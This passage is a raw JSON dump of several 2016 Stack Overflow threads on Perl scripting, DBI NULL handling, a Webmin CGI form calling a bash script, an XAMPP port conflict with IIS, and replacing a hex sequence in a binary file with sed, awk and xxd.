"link": "https://stackoverflow.com/questions/35224788/how-to-keep-the-column-left-aligned-in-perl/35225235#35225235", "title": "How to keep the column left aligned in perl", "body": "<p>There are two problems with your script.  First the space alignment with the 3 digit 6th column entries</p>\n\n<p>Second the use of the g flag on the regexp which clobbers any other data that happens to be the same as the 6th column</p>\n\n<p>The script below corrects these two problems.  The space alignment is overcome by matching on the whitespace and the digits in the 6th column and substituting in a even amount of whitespace.  This will work with $n up to 4 digits and assuming that the number in the 6 column does not occur before the 6th column.  If it does then the regexp will alter the first number.</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\n\nopen( DATA, \"&lt;try.pdb\" ) or die \"not\";\n\n#open (FILE,\"&gt;file.txt\") or die \"no\";\nmy $n = sprintf( \"%4d\", 98 );\nforeach my $line1 (&lt;DATA&gt;) {\n\n    if ( $line1 =~ m/^ATOM\\s+\\d+\\s+[A-Z]+\\s+[A-Z]+\\s+P(\\s+\\d+)/ ) {\n\n        $line1 =~ s/$1/ $n/;\n        print $line1;\n    }\n    $n++;\n    $n = sprintf( \"%4d\", $n );\n}\n</code></pre>\n"}], "owner": {"reputation": 115, "user_id": 3867469, "user_type": "registered", "accept_rate": 7, "profile_image": "https://www.gravatar.com/avatar/a349af8334c0f5b740aa4799a5c06a29?s=128&d=identicon&r=PG&f=1", "display_name": "swapnil90", "link": "https://stackoverflow.com/users/3867469/swapnil90"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 299, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1454679044, "creation_date": 1454676843, "question_id": 35224788, "link": "https://stackoverflow.com/questions/35224788/how-to-keep-the-column-left-aligned-in-perl", "title": "How to keep the column left aligned in perl", "body": "<p>I have a file, in which i need to sequentially order one of the column. I have ordered the same but facing alignment problem with few of the rows. I am not getting how to keep the column aligned.</p>\n\n<p>Following is my reference file where I am concentrating on only 6th column:</p>\n\n<pre><code>ATOM      1  CA  GLY P  12       9.393  37.464  31.388  0.00  0.00      P1    \nATOM      2  CA  SER P  13      12.158  39.603  32.954  0.00  0.00      P1\nATOM      3  CA  VAL P  52      41.104  47.186  31.473  0.00  0.00      P1    \nATOM      4  CA  GLN P 164      36.217  27.890  29.620  0.00  0.00      P1    \nATOM      5  CA  GLN P 165      34.809  29.586  32.649  0.00  0.00      P1    \nATOM      6  CA  GLY P  12      10.007  25.374  54.523  0.00  0.00      P2    \nATOM      7  CA  SER P  13      13.212  23.440  53.698  0.00  0.00      P2    \nATOM      8  CA  ASP P  14      16.884  24.084  54.463  0.00  0.00      P2   \n</code></pre>\n\n<p>Following is my code:</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\n\nopen (DATA, \"&lt;try.pdb\") or die \"not\";\nopen (FILE,\"&gt;file.txt\") or die \"no\";\nmy $n=11;\nforeach my $line1 (&lt;DATA&gt;){\n\nif ($line1 =~ m/^ATOM\\s+\\d+\\s+[A-Z]+\\s+[A-Z]+\\s+P\\s+(\\d+)/){\n\n$line1 =~ s/$1/$n/g;\nprint FILE $line1;\n}\n$n++;\n}\n</code></pre>\n\n<p>Following is my output where alignment for 4th and 5th row got changed because in reference file there were three digit numbers.</p>\n\n<pre><code>ATOM      1  CA  GLY P  12       9.393  37.464  31.388  0.00  0.00      P1    \nATOM      2  CA  SER P  13      12.158  39.603  32.954  0.00  0.00      P1   \nATOM     41  CA  VAL P  14      41.104  47.186  31.473  0.00  0.00      P1    \nATOM    153  CA  GLN P 15      36.217  27.890  29.620  0.00  0.00      P1    \nATOM    154  CA  GLN P 16      34.809  29.586  32.649  0.00  0.00      P1    \nATOM    155  CA  GLY P  17      10.007  25.374  54.523  0.00  0.00      P2    \nATOM    156  CA  SER P  18      18.212  23.440  53.698  0.00  0.00      P2    \nATOM    157  CA  ASP P  19      16.884  24.084  54.463  0.00  0.00      P2\n</code></pre>\n"}, {"tags": ["mysql", "perl", "dbi"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 2, "creation_date": 1454671340, "post_id": 35222216, "comment_id": 58159731, "body": "Your whole <code>get_rows</code> function could be replaced by DBI&#39;s <code>selectall_hashref</code> method."}, {"owner": {"reputation": 59411, "user_id": 8355, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/8d0099a2574719d7a67eab012851bf9b?s=128&d=identicon&r=PG", "display_name": "cjm", "link": "https://stackoverflow.com/users/8355/cjm"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 2, "creation_date": 1454687944, "post_id": 35222216, "comment_id": 58171380, "body": "@simbabque, you meant <code>selectall_arrayref</code>."}], "answers": [{"comments": [{"owner": {"reputation": 53, "user_id": 5583370, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/ebe9d1eea735c99ea47e30c5cf58100a?s=128&d=identicon&r=PG&f=1", "display_name": "D2J2", "link": "https://stackoverflow.com/users/5583370/d2j2"}, "edited": false, "score": 0, "creation_date": 1454672246, "post_id": 35222879, "comment_id": 58160312, "body": "Thanks. Had not seen this. I&#39;ve ended up modifying the query rather than the code as was one of the suggestions on the DBI documentation."}], "tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": true, "score": 2, "last_activity_date": 1454671284, "creation_date": 1454671284, "answer_id": 35222879, "question_id": 35222216, "link": "https://stackoverflow.com/questions/35222216/perl-dbi-where-is-null-with-undefined-variable/35222879#35222879", "title": "Perl DBI where IS NULL with undefined variable", "body": "<p>This is documented in <a href=\"http://p3rl.org/DBI\" rel=\"nofollow\">DBI</a> under <em>NULL Values</em>.</p>\n\n<pre><code>$sql_clause = defined $age? \"age = ?\" : \"age IS NULL\";\n$sth = $dbh-&gt;prepare(qq{\n  SELECT fullname FROM people WHERE $sql_clause\n});\n$sth-&gt;execute(defined $age ? $age : ());\n</code></pre>\n"}], "owner": {"reputation": 53, "user_id": 5583370, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/ebe9d1eea735c99ea47e30c5cf58100a?s=128&d=identicon&r=PG&f=1", "display_name": "D2J2", "link": "https://stackoverflow.com/users/5583370/d2j2"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1032, "favorite_count": 0, "accepted_answer_id": 35222879, "answer_count": 1, "score": 0, "last_activity_date": 1454671284, "creation_date": 1454669358, "last_edit_date": 1454670116, "question_id": 35222216, "link": "https://stackoverflow.com/questions/35222216/perl-dbi-where-is-null-with-undefined-variable", "title": "Perl DBI where IS NULL with undefined variable", "body": "<p>I have a <code>perl</code> <code>DBI</code> <code>mysql</code> query that looks like this:</p>\n\n<pre><code>my $rows = get_rows(\n    \"select id from table where column1=?, column2=? and column3=?\",\n    $var1,$var2,$var3\n    );\n\nsub get_rows {\n\n    my $sql = shift;\n    my @vars = @_;      \n    my $sth = $dbh-&gt;prepare($sql);\n    $sth-&gt;execute(@vars);\n    my $rows = $sth-&gt;fetchall_arrayref();\n    $sth-&gt;finish();         \n    return $rows;\n    }\n</code></pre>\n\n<p>I'm running this to check if a particular row exists containing those vars. The problem I have however is with dealing with NULL values. These have to be selected as <code>IS NULL</code> rather than <code>=?</code>, which very often then misses rows that contain NULL values. For example, if vars 1, 2 and 3 contain <code>'12'</code>, <code>'23'</code> and <code>undef</code> and <code>table</code> contains <code>12</code>, <code>23</code> and <code>NULL</code> then the query returns no results. Is there a simple way to transform undef values into <code>IS NULL</code> values with <code>DBI</code>?</p>\n"}, {"tags": ["bash", "perl", "post", "cgi", "webmin"], "comments": [{"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 1, "creation_date": 1454670113, "post_id": 35221991, "comment_id": 58158898, "body": "If you POST to a script then the parameters are given via STDIN, i.e. from within your bash script you must read STDIN to get them. Perhaps this might help: <a href=\"http://stackoverflow.com/a/5451943/5830574\">stackoverflow.com/a/5451943/5830574</a>"}], "answers": [{"comments": [{"owner": {"reputation": 354, "user_id": 984080, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/58f31e67b0a1c58b1bf9e3b84148db6a?s=128&d=identicon&r=PG", "display_name": "clint_milner", "link": "https://stackoverflow.com/users/984080/clint-milner"}, "edited": false, "score": 1, "creation_date": 1454687867, "post_id": 35222754, "comment_id": 58171331, "body": "Thanks for the HTML tip, and best-practices. I&#39;m in a limited-resource enviroment, so I was hoping you had a tip, or walk-through for the next step of getting the form field data into the mySync.sh file? Thanks."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 0, "last_activity_date": 1454688320, "last_edit_date": 1454688320, "creation_date": 1454670876, "answer_id": 35222754, "question_id": 35221991, "link": "https://stackoverflow.com/questions/35221991/how-to-post-form-data-to-a-bash-script-from-cgi-file/35222754#35222754", "title": "How to POST form data to a bash script from cgi file?", "body": "<p>Writing a CGI program in 2016 seems rather backwards-looking. I'd recommend installing <a href=\"https://metacpan.org/pod/Plack\" rel=\"nofollow\">Plack</a> and writing a PSGI program instead.</p>\n\n<p>But let's assume that you have good reasons for using outdated technology.</p>\n\n<p>You should always start a Perl program with:</p>\n\n<pre><code>use strict;\nuse warnings;\n</code></pre>\n\n<p>These will show up some problems in your code. For example, I see that you are using a hash called <code>%text</code> (<code>$text{'index_title'}</code>) without declaring it anywhere - perhaps that happens in <code>mySync-lib.pl</code>, I have no way of knowing.</p>\n\n<p>If you're writing a CGI program then you should really use <a href=\"https://metacpan.org/pod/CGI\" rel=\"nofollow\">CGI.pm</a> to make your life easier. You can get access to the parameters passed to your program using the <code>param()</code> function. If you're using Perl 5.22, thne you'll need to install CGI.pm as it is no longer part of the standard installation.</p>\n\n<p>You don't need to an individual <code>print()</code> statement for every line of HTML.\nYou can print the whole lot on one go with a \"heredoc\".</p>\n\n<pre><code>print &lt;&lt;\"END_HTML\";\n&lt;div class='container'&gt;\n... lots more HTML\n&lt;/div&gt;\nEND_HTML\n</code></pre>\n\n<p>But the best approach would be to move your HTML pages out into external files and use a <a href=\"https://metacpan.org/pod/Template\" rel=\"nofollow\">templating system</a>.</p>\n\n<p>We haven't needed to use <code>&amp;</code> to call Perl functions for over twenty years. Please don't do that.</p>\n\n<p><strong>Update:</strong> Without writing your code for you, the program would probably look something like this:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse CGI qw[header param];\n\nif (param()) { # parameters have been passed from the form\n  # Use param() to get the input parameters\n  # Use backticks to run your shell script and collect the output\n  # Display output to the users\n} else {\n  # Display the input form to the users\n}\n</code></pre>\n"}], "owner": {"reputation": 354, "user_id": 984080, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/58f31e67b0a1c58b1bf9e3b84148db6a?s=128&d=identicon&r=PG", "display_name": "clint_milner", "link": "https://stackoverflow.com/users/984080/clint-milner"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 740, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1454688320, "creation_date": 1454668770, "question_id": 35221991, "link": "https://stackoverflow.com/questions/35221991/how-to-post-form-data-to-a-bash-script-from-cgi-file", "title": "How to POST form data to a bash script from cgi file?", "body": "<p>I've been tasked with creating a simple page and form in Webmin that takes 5 parameters, and sends them to a bash script for further processing.</p>\n\n<p>Nothing fancy, but this is new to me, and I'm unsure how to accomplish this task.</p>\n\n<p>I'm able to manually pass parameters to my bash script like</p>\n\n<pre><code>sh mySync.sh \"1.2.3.4\" \"user\" \"password\" \"abc\" \"def\"\n</code></pre>\n\n<p>and they they echo out accordingly. </p>\n\n<p>Here are my files:</p>\n\n<p><strong>index.cgi</strong></p>\n\n<pre><code>#!/usr/bin/perl\n\nrequire 'mySync-lib.pl';\nui_print_header(undef, $text{'index_title'}, \"\", undef, 1, 1);\n\n$conf = get_mySync_config();\nprint &amp;text('index_root', $dir),\"&lt;p&gt;\\n\";\n\n\nprint( \"&lt;div class='container'&gt;\" );\nprint( \"&lt;div class='row'&gt;\" );\nprint( \"&lt;h3&gt;MySync&lt;/h3&gt;\" );\nprint( \"&lt;p&gt;Use this utility to pass params to mySync.sh&lt;/p&gt;\" );\nprint( \"&lt;form class='form-horizontal' method='POST' action='mySync.sh'&gt;\" );\n\nprint( \"&lt;div class='form-group'&gt;\" );\nprint( \"&lt;label for='targetServer' class='col-xs-2 control-label'&gt;Target Server&lt;/label&gt;\" );\nprint( \"&lt;div class='col-xs-7'&gt;\" );\nprint( \"&lt;input type='text' class='form-control' name='targetServer' id='targetServer' placeholder='Target Server'&gt;\" );\nprint( \"&lt;/div&gt;\" );\nprint( \"&lt;/div&gt;\" );\n\nprint( \"&lt;div class='form-group'&gt;\" );\nprint( \"&lt;label for='userName' class='col-xs-2 control-label'&gt;User Name&lt;/label&gt;\" );\nprint( \"&lt;div class='col-xs-7'&gt;\" );\nprint( \"&lt;input type='text' class='form-control' name='userName' id='userName' placeholder='User Name'&gt;\" );\nprint( \"&lt;/div&gt;\" );\nprint( \"&lt;/div&gt;\" );\n\nprint( \"&lt;div class='form-group'&gt;\" );\nprint( \"&lt;label for='password' class='col-xs-2 control-label'&gt;Password&lt;/label&gt;\" );\nprint( \"&lt;div class='col-xs-7'&gt;\" );\nprint( \"&lt;input type='password' class='form-control' name='password' id='password'&gt;\" );\nprint( \"&lt;/div&gt;\" );\nprint( \"&lt;/div&gt;\" );\n\nprint( \"&lt;div class='form-group'&gt;\" );\nprint( \"&lt;label for='srcScope' class='col-xs-2 control-label'&gt;Source Scope&lt;/label&gt;\" );\nprint( \"&lt;div class='col-xs-7'&gt;\" );\nprint( \"&lt;input type='text' class='form-control' name='srcScope' id='srcScope'&gt;\" );\nprint( \"&lt;/div&gt;\" );\nprint( \"&lt;/div&gt;\" );\n\nprint( \"&lt;div class='form-group'&gt;\" );\nprint( \"&lt;label for='destScope' class='col-xs-2 control-label'&gt;Destination Scope&lt;/label&gt;\" );\nprint( \"&lt;div class='col-xs-7'&gt;\" );\nprint( \"&lt;input type='text' class='form-control' name='destScope' id='destScope'&gt;\" );\nprint( \"&lt;/div&gt;\" );\nprint( \"&lt;/div&gt;\" );\n\nprint( \"&lt;div class='form-group'&gt;\" );\nprint( \"&lt;div class='col-xs-offset-2 col-xs-10'&gt;\" );\nprint( \"&lt;button type='submit' class='btn btn-default'&gt;Send Data to mySync.sh&lt;/button&gt;\" );\nprint( \"&lt;/div&gt;\" );\nprint( \"&lt;/div&gt;\" );\n\nprint( \"&lt;/form&gt;\" );\nprint( \"&lt;/div&gt;\" );\nprint( \"&lt;/div&gt; &lt;!- end of container -&gt;\" );\n\n\nui_print_footer(\"/\", $text{'index'});\n</code></pre>\n\n<p><strong>mySync.sh</strong></p>\n\n<pre><code>#!/bin/bash\n\necho \"BASH FIELD 1:    $1\"\necho \"BASH FIELD 2:    $2\"\necho \"BASH FIELD 3:    $3\"\necho \"BASH FIELD 4:    $4\"\necho \"BASH FIELD 5:    $5\"\n</code></pre>\n\n<p>Please let me know if I'm missing a step, or what the next logical step would be.\nThanks!</p>\n"}, {"tags": ["java", "php", "android", "apache", "perl"], "comments": [{"owner": {"reputation": 584, "user_id": 1411096, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/283533fdbbd8d03caa7b531f2de67045?s=128&d=identicon&r=PG", "display_name": "Architect Nate", "link": "https://stackoverflow.com/users/1411096/architect-nate"}, "edited": false, "score": 0, "creation_date": 1454663170, "post_id": 35220041, "comment_id": 58154520, "body": "Something else is using your port 80, either kill the process that is using it, or go into the apache config and use a different port. ie 8080  <a href=\"http://localhost:8080\" rel=\"nofollow noreferrer\">localhost:8080</a> is then what you would use as your url."}, {"owner": {"reputation": 83063, "user_id": 2310830, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/P6rM1.png?s=128&g=1", "display_name": "RiggsFolly", "link": "https://stackoverflow.com/users/2310830/riggsfolly"}, "edited": false, "score": 0, "creation_date": 1454663867, "post_id": 35220041, "comment_id": 58154911, "body": "As it is talking about something else using port 80 on <b>PID 4</b> its probably IIS and its associated parts. If you are running W10 then that is almost definitely the case."}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 4937018, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/4d5db23d90a70fbef40314dd1d251a91?s=128&d=identicon&r=PG&f=1", "display_name": "Shubham Singh", "link": "https://stackoverflow.com/users/4937018/shubham-singh"}, "edited": false, "score": 0, "creation_date": 1454827272, "post_id": 35220459, "comment_id": 58214275, "body": "sir still facing same problem i have made all changes as you have mentioned  above . I am getting same error ."}], "tags": [], "owner": {"reputation": 83063, "user_id": 2310830, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/P6rM1.png?s=128&g=1", "display_name": "RiggsFolly", "link": "https://stackoverflow.com/users/2310830/riggsfolly"}, "is_accepted": false, "score": 1, "last_activity_date": 1454664393, "creation_date": 1454664393, "answer_id": 35220459, "question_id": 35220041, "link": "https://stackoverflow.com/questions/35220041/xampp-apache-not-working-err-message-api-ms-win-missing/35220459#35220459", "title": "xampp apache not working err message api ms win missing", "body": "<p>Ok so that means your system has Microsoft IIS installed or one of the other bits of MS technology that reports that signature, they are doing that on later versions of Windows for some reason.\nIf you are not intending to use it you can uninstall it, it is not an integral part of windows so its being uninstalled wont effect normal operations of windows,\nand if you need to install it again later, it comes as part of the standard OS so you wont need to do anything perticularly clever.</p>\n\n<p>So go to </p>\n\n<ol>\n<li>Start -> Control Panel -> Programs and Features</li>\n<li>Click the 'Turn windows features on and off' link in the left hand\nmenu.</li>\n<li>Wait for the list to load and then find 'Internet Information\nServices'</li>\n</ol>\n\n<p>Un check the check boxes for the following items ( you may not see all of them ), and there may be others I done know about. You may have all of these or just some of these.</p>\n\n<ol>\n<li>IIS</li>\n<li>Web Deploy 2.0 (Web Deployment Agent Service)</li>\n<li>MS Sql Server Reporting service.</li>\n<li>BranchCache ( Windows 8.1 )</li>\n<li>SQL Server VSS Writer</li>\n</ol>\n\n<p><a href=\"http://blogs.technet.com/b/fort_sql/archive/2010/05/31/list-of-sql-server-service-names.aspx\" rel=\"nofollow\">List of possible service names</a> not sure how up to date this is.</p>\n\n<p><a href=\"http://blogs.msdn.com/b/bgroth/archive/2004/11/11/256190.aspx\" rel=\"nofollow\">Tutorial on how to find what ports are in use on your system and what app is using them</a></p>\n\n<p>Windows will then have a think for a while and then remove those applications, you will probably be asked to reboot to complete the uninstalls.\nReboot anyway when the uninstalls are complete.</p>\n\n<p>Then try XAMPP again.</p>\n\n<p>Alternativeley just disable it/them.</p>\n\n<pre><code>Start -&gt; Control Panel -&gt; Administrative Tools -&gt; Services\n</code></pre>\n\n<p>Find IIS in the list of services.\nLeft Click that line and select Properties</p>\n"}], "owner": {"reputation": 11, "user_id": 4937018, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/4d5db23d90a70fbef40314dd1d251a91?s=128&d=identicon&r=PG&f=1", "display_name": "Shubham Singh", "link": "https://stackoverflow.com/users/4937018/shubham-singh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 471, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1454664393, "creation_date": 1454662972, "question_id": 35220041, "link": "https://stackoverflow.com/questions/35220041/xampp-apache-not-working-err-message-api-ms-win-missing", "title": "xampp apache not working err message api ms win missing", "body": "<p>Problem detected!\nApache WILL NOT start without the configured ports free!</p>\n\n<pre><code>You need to uninstall/disable/reconfigure the blocking application\nor reconfigure Apache and the Control Panel to listen on a different port\nStarting Check-Timer\nControl Panel Ready\nProblem detected!\nPort 80 in use by \"Unable to open process\" with PID 4!\nApache WILL NOT start without the configured ports free!\nYou need to uninstall/disable/reconfigure the blocking application\nor reconfigure Apache and the Control Panel to listen on a different port\nAttempting to start Apache app...\nStatus change detected: running\nStatus change detected: stopped\nError: Apache shutdown unexpectedly.\nThis may be due to a blocked port, missing dependencies, \nimproper privileges, a crash, or a shutdown by another method.\n</code></pre>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 481636, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "edited": false, "score": 0, "creation_date": 1454658984, "post_id": 35218862, "comment_id": 58152336, "body": "Well, there&#39;s more than regex to explain here. Still looks off-topic."}], "answers": [{"comments": [{"owner": {"reputation": 31, "user_id": 1747475, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2fd664797dd6edb8806224219ef29df7?s=128&d=identicon&r=PG", "display_name": "Samit Kumar Patra", "link": "https://stackoverflow.com/users/1747475/samit-kumar-patra"}, "edited": false, "score": 0, "creation_date": 1454659759, "post_id": 35218996, "comment_id": 58152702, "body": "Thanks .. that\u2019s answers my questions.."}, {"owner": {"reputation": 4514, "user_id": 4248931, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/HijcJ.png?s=128&g=1", "display_name": "serenesat", "link": "https://stackoverflow.com/users/4248931/serenesat"}, "reply_to_user": {"reputation": 31, "user_id": 1747475, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2fd664797dd6edb8806224219ef29df7?s=128&d=identicon&r=PG", "display_name": "Samit Kumar Patra", "link": "https://stackoverflow.com/users/1747475/samit-kumar-patra"}, "edited": false, "score": 0, "creation_date": 1454662168, "post_id": 35218996, "comment_id": 58153954, "body": "@SamitKumarPatra: Then accept this as an answer, so it can be closed as solved."}], "tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": false, "score": 2, "last_activity_date": 1454659460, "last_edit_date": 1454659460, "creation_date": 1454659156, "answer_id": 35218996, "question_id": 35218862, "link": "https://stackoverflow.com/questions/35218862/wanted-clarification/35218996#35218996", "title": "Wanted clarification", "body": "<p>You can find various Perl special variables in <a href=\"http://p3rl.org/perlvar\" rel=\"nofollow\">perlvar</a>. <code>$0</code> is explained there.</p>\n\n<p>As mentioned in <a href=\"http://p3rl.org/perlop\" rel=\"nofollow\">perlop</a>, the substitution operator <code>s/REGEX/REPLACEMENT/</code> can be written with different delimiters, e.g. dashes. It's handy when the regex or replacement contain slashes, as is the case here. Using paired delimiters might be more readable:</p>\n\n<pre><code>s{/[^/]+/[^/]+$}{/lib/perl}\n</code></pre>\n\n<p>or, using <code>/x</code>:</p>\n\n<pre><code>s{ / [^/]+ / [^/]+ $ }{/lib/perl}x\n</code></pre>\n"}], "owner": {"reputation": 31, "user_id": 1747475, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2fd664797dd6edb8806224219ef29df7?s=128&d=identicon&r=PG", "display_name": "Samit Kumar Patra", "link": "https://stackoverflow.com/users/1747475/samit-kumar-patra"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 49, "favorite_count": 0, "closed_date": 1454662936, "answer_count": 1, "score": -4, "last_activity_date": 1454659460, "creation_date": 1454658659, "last_edit_date": 1454658815, "question_id": 35218862, "link": "https://stackoverflow.com/questions/35218862/wanted-clarification", "closed_reason": "Duplicate", "title": "Wanted clarification", "body": "<p>I am trying to understand some code which is already written.. </p>\n\n<p>I am not able to understand </p>\n\n<pre><code>my $l = $0; $l =~ s-/[^/]+/[^/]+$-/lib/perl-; \n</code></pre>\n\n<p>what is assigned to $0 ?\nwhat is - (Hyphen) operator in the expression ?\nwhay $- is used in the expression?</p>\n\n<p>Please explain the ablove 3Qs.</p>\n\n<pre><code>BEGIN {\n# figure out our general library path\nmy $p;\nmy $l = $0; $l =~ s-/[^/]+/[^/]+$-/lib/perl-; \npush @INC,$l;\n# add some platform components, based on files\npush @INC,\"$l/sunos\"  if ( grep /solaris/,@INC );\npush @INC,\"$l/csw\"    if ( grep /csw/,@INC );\npush @INC,\"$l/i386\"   if ( grep /i386/,@INC );\npush @INC,\"$l/x86_64\" if ( grep /x86_64/,@INC );\n}\n</code></pre>\n"}, {"tags": ["bash", "perl", "awk", "sed"], "comments": [{"owner": {"reputation": 68617, "user_id": 3776858, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/juunm.png?s=128&g=1", "display_name": "Cyrus", "link": "https://stackoverflow.com/users/3776858/cyrus"}, "edited": false, "score": 0, "creation_date": 1454651431, "post_id": 35216909, "comment_id": 58149252, "body": "Please take a look at <a href=\"http://stackoverflow.com/editing-help\">editing-help</a>."}], "answers": [{"tags": [], "owner": {"reputation": 4887, "user_id": 897295, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Kql9J.png?s=128&g=1", "display_name": "mauro", "link": "https://stackoverflow.com/users/897295/mauro"}, "is_accepted": false, "score": 0, "last_activity_date": 1454652037, "creation_date": 1454652037, "answer_id": 35217281, "question_id": 35216909, "link": "https://stackoverflow.com/questions/35216909/find-and-replace-exact-matching-hex-on-multiple-lines/35217281#35217281", "title": "find and replace exact matching hex on multiple lines", "body": "<p>Hex codes can be <strong>printed</strong> using multiple lines by the tool you use to produce the hex dump but the hex string contained in the original file is not \"broken\" into multiple lines. I mean if \"2f 34 2e 30 20 28 63 6f\" contained a new line somewhere... it would be a different hex sequence.</p>\n\n<p>That said, I think you can just use sed:</p>\n\n<pre><code>$ sed 's/\\x2f\\x34\\x2e\\x30\\x20\\x28\\x63\\x6f/\\x2f\\x35\\x2e\\x30\\x20\\x28\\x68\\x63/' your_file\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "is_accepted": false, "score": 0, "last_activity_date": 1454696668, "last_edit_date": 1454696668, "creation_date": 1454692552, "answer_id": 35229848, "question_id": 35216909, "link": "https://stackoverflow.com/questions/35216909/find-and-replace-exact-matching-hex-on-multiple-lines/35229848#35229848", "title": "find and replace exact matching hex on multiple lines", "body": "<p>Here's one way that doesn't care how long the string is you're trying to replace or how many lines it's split over:</p>\n\n<pre><code>$ cat tst.awk\n{\n    keys[NR] = $1\n    sub(/^[^[:space:]]+[[:space:]]+/,\"\")\n    buf = (NR&gt;1 ? buf FS : \"\") $0\n}\nEND {\n    gsub(old,new,buf)\n    for (i=1; i&lt;length(buf); i+=(NF*3)) {\n        print keys[++nr] \"  \" substr(buf,i,(NF*3)-1)\n    }\n}\n\n$ awk -v old=\"2f 34 2e 30 20 28 63 6f\" -v new=\"2f 35 2e 30 20 28 68 63\" -f tst.awk file\n0070  41 67 65 6e 74 3a 20 4d 6f 7a 69 6c 6c 61 2f 35\n0080  2e 30 20 28 68 63 6d 70 61 74 69 62 6c 65 3b 20\n</code></pre>\n\n<p>It does read the whole file into memory though, idk if that's an issue for you or not. If it is you can define <code>buf</code> to be some max size and write code to rotate all of your input lines through it FIFO, doing the <code>gsub()</code> every time <code>buf</code> changes but that will be more complicated and less efficient and you then have to consider the 2nd <code>gsub()</code> potentially running on data that was modified by the 1st <code>gsub()</code> instead of on the original data.</p>\n"}, {"tags": [], "owner": {"reputation": 144799, "user_id": 2836621, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/suHg4.jpg?s=128&g=1", "display_name": "Mark Setchell", "link": "https://stackoverflow.com/users/2836621/mark-setchell"}, "is_accepted": false, "score": 0, "last_activity_date": 1454701285, "creation_date": 1454701285, "answer_id": 35232203, "question_id": 35216909, "link": "https://stackoverflow.com/questions/35216909/find-and-replace-exact-matching-hex-on-multiple-lines/35232203#35232203", "title": "find and replace exact matching hex on multiple lines", "body": "<p>Here's one way to do it. First dump the file in <em>plain format</em> using <code>xxd</code> and that will suppress the addresses down the left side. Now delete all the linefeeds so that nothing can span multiple lines since your file is now one long line, then make your substitution with impunity, and rebuild with <code>xxd</code> again. It takes longer to describe than do!</p>\n\n<pre><code>xxd -p input.bin | tr -d '\\n' | sed 's/2f342e302028636f/2f352e3020286863/g' | xxd -r -p - patched.bin\n</code></pre>\n\n<p>You better use <strong>GNU sed</strong> though as it has no limits on line length.</p>\n"}, {"tags": [], "owner": {"reputation": 46858, "user_id": 967492, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/526ea226101e199d029049dda22a4e58?s=128&d=identicon&r=PG", 